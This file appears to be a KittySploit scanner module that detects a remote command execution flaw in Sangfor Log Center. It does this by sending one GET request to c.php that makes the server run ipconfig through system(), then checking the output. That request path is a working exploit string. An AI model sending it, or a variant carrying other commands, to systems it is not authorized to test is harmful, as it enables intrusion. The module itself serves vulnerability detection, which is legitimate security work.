#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sangfor Log Center is vulnerable to RCE."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Sangfor Log Center - Remote Command Execution Detection',
        'description': 'Sangfor Log Center is vulnerable to RCE.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'sangfor', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83%20c.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md?plain=1',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/tool/log/c.php?strip_slashes=system&host=ipconfig', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Windows IP', 'Log Helper',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Sangfor Log Center - Remote Command Execution detected",
                path='/tool/log/c.php?strip_slashes=system&host=ipconfig',
            )
            return True
        return False

